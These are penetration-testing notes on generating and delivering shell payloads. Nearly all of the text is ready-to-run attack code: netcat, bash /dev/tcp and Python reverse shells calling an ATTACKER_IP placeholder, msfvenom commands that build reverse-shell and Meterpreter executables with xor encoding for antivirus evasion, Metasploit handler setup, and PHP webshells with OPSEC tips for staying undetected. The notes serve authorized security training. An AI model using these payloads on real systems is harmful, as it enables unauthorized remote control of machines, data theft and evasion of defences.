Shell Payload Generation & Delivery – Pentest Notes
Concept

Getting RCE is useless unless you can turn it into a shell.

A payload is executable code that creates a shell automatically.

Instead of manually typing:

nc ATTACKER_IP 4444 -e /bin/bash

you generate a payload that does it for you.

Used for:

File Uploads
RCE
Phishing
Macro attacks
Exploits
Scheduled Tasks
Service exploits
Payload Flow
Gain Code Execution
        │
        ▼
Generate Payload
        │
        ▼
Deliver Payload
        │
        ▼
Execute Payload
        │
        ▼
Listener catches shell
        │
        ▼
Stabilise Shell
        │
        ▼
Privilege Escalation
Payload Types
Reverse Shell

Target connects back.

Victim  ─────────► Attacker

Most common.

Use when:

Firewall blocks inbound
Target has internet access
NAT exists
Bind Shell

Victim waits.

Attacker ─────────► Victim

Use when:

Outbound blocked
Inbound allowed

Less common.

Manual Payloads

Useful when:

msfvenom unavailable
AV blocks binaries
Need one-liners
Netcat Reverse
nc ATTACKER_IP 4444 -e /bin/bash
Netcat Reverse (No -e)
mkfifo /tmp/f
nc ATTACKER_IP 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1
rm /tmp/f

Works on OpenBSD Netcat.

Netcat Bind
mkfifo /tmp/f
nc -lvnp 8080 < /tmp/f | /bin/sh >/tmp/f 2>&1
rm /tmp/f
Bash Reverse Shell
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

Requirements

Bash
/dev/tcp enabled
Python Reverse Shell
python3 -c '
import socket,os,pty
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
'

One of the best Linux payloads.

PowerShell Reverse Shell

Large one-liner using .NET TCPClient.

Use when:

Windows
PowerShell installed
No uploads possible
Choosing Payloads
Target	Best Choice
Linux	Bash / Python
Windows	PowerShell
Netcat Installed	Netcat
No Netcat	Python / Bash
File Upload	msfvenom
Web App	Webshell
Payload Resources

Bookmark:

PayloadsAllTheThings

Contains payloads for:

Bash
Python
PHP
Perl
Ruby
Java
PowerShell
NodeJS
Lua
ASP
JSP

Excellent during engagements.

msfvenom

Purpose:

Generate payloads.

Supports:

Windows
Linux
macOS
Android
PHP
JSP
ASPX
WAR
Python
PowerShell
Basic Syntax
msfvenom \
-p PAYLOAD \
LHOST=IP \
LPORT=PORT \
-f FORMAT \
-o OUTPUT

Example

msfvenom \
-p windows/x64/shell/reverse_tcp \
LHOST=10.10.14.15 \
LPORT=4444 \
-f exe \
-o shell.exe

Creates:

shell.exe
Important Flags
Flag	Meaning
-p	Payload
-f	Output format
-o	Output filename
LHOST	Callback IP
LPORT	Callback Port
-e	Encoder
-i	Encoder iterations
Output Formats

Windows

exe
dll
powershell

Linux

elf
python

Web

php
jsp
war
aspx
Stageless Payloads

Everything included inside payload.

Victim
   │
   ▼
Connects

Advantages

Works with Netcat
Simpler
Reliable

Disadvantages

Larger
Easier AV detection

Example

linux/x64/shell_reverse_tcp

Notice:

shell_reverse_tcp

Underscore.

Staged Payloads

Tiny payload first.

Downloads second stage.

Victim
   │
   ▼
Small Stager
   │
   ▼
Downloads Payload
   │
   ▼
Gets Shell

Advantages

Smaller initial file
Better AV evasion
Meterpreter support

Disadvantages

Requires multi/handler

Example

windows/x64/shell/reverse_tcp

Notice:

shell/reverse_tcp

Forward slash.

Easy way to remember:

underscore = stageless

slash = staged
Meterpreter

Advanced Metasploit shell.

Features

File upload/download
Webcam
Keylogging
Process migration
Token stealing
Privilege escalation
Pivoting
Screenshots
Hash dumping

Requires:

multi/handler

Generate Meterpreter

msfvenom \
-p windows/x64/meterpreter/reverse_tcp \
LHOST=IP \
LPORT=4444 \
-f exe \
-o meterpreter.exe
List Payloads
msfvenom --list payloads

Search

msfvenom --list payloads | grep meterpreter
Encoding

Used for basic AV evasion.

Example

msfvenom \
-p windows/x64/shell_reverse_tcp \
-e x64/xor \
-i 3 \
-f exe \
-o encoded.exe

Flags

-e

Encoder.

-i

Number of encoding passes.

Modern EDR often detects behavior anyway.

multi/handler

Purpose:

Catch staged payloads.

Supports

Meterpreter
Staged Payloads
Multiple sessions
Session management
Start
sudo msfconsole

Load

use multi/handler

Configure

set PAYLOAD windows/x64/shell/reverse_tcp

set LHOST 10.10.14.15

set LPORT 4444

Start Listener

exploit -j

Background job starts.

Sessions

List

sessions

Interact

sessions -i 1

Background session

background

or

Ctrl+Z
Handler vs Netcat

Use Netcat

✔ Quick shells

✔ Stageless payloads

✔ Simple reverse shells

Use multi/handler

✔ Meterpreter

✔ Staged payloads

✔ Multiple shells

✔ Session management

✔ Post-exploitation

Webshells

Runs commands through HTTP.

Looks like normal web traffic.

Useful when:

File upload vulnerability
Only HTTP allowed
Reverse shell blocked
Basic PHP Webshell
<?php echo shell_exec($_GET["cmd"]); ?>

Usage

shell.php?cmd=whoami

POST Version

<?php
echo shell_exec($_POST["cmd"]);
?>

Keeps commands out of URL history.

Password Protected

if($_POST['auth']=="password"){
    echo shell_exec($_POST['cmd']);
}

Other Webshell Types

Windows IIS

ASPX

Java

JSP

PHP

PHP
Upgrade Webshell

Instead of

whoami

Execute

Bash Reverse Shell
Python Reverse Shell
PowerShell Reverse Shell

to obtain an interactive shell.

PentestMonkey

Location

/usr/share/webshells/php/

Contains

php-reverse-shell.php

Popular PHP reverse shell.

OPSEC

Avoid

Repeated requests
Suspicious filenames
GET parameters
Noisy commands

Prefer

POST
HTTPS
Realistic filenames
Slow command execution

Always remove webshells after the engagement.

Payload Decision Tree
RCE?
 │
 ▼
Can upload executable?
 │
 ├── Yes
 │      │
 │      ▼
 │   msfvenom payload
 │
 └── No
        │
        ▼
Can execute commands?
        │
        ├── Linux
        │      ├ Bash
        │      ├ Python
        │      └ Netcat
        │
        └── Windows
               ├ PowerShell
               └ msfvenom
Engagement Workflow (Memorize)
Gain RCE
      │
      ▼
Choose payload
      │
      ▼
Generate (msfvenom/manual)
      │
      ▼
Start listener
(Netcat or multi/handler)
      │
      ▼
Execute payload
      │
      ▼
Catch shell
      │
      ▼
Stabilise shell
      │
      ▼
Privilege Escalation
